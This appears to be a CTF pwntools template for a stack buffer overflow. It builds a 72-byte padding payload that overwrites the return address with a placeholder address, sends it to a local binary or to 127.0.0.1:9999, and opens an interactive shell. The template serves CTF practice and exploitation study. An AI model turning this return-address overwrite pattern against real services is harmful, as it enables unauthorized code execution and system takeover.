#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Basic PWN Template - Stack Buffer Overflow
Author: CTF Player
Date: 2025-01-XX
Target: target_binary
"""

from pwn import *

# 设置目标程序
binary = "./target"
elf = ELF(binary)

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'  # 或 'i386'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("127.0.0.1", 9999)
    else:
        p = process(binary)

    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')

    # Exploit 代码
    payload = b"A" * 72  # 填充到返回地址
    payload += p64(0x401234)  # 覆盖返回地址

    # 发送payload
    p.sendline(payload)

    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
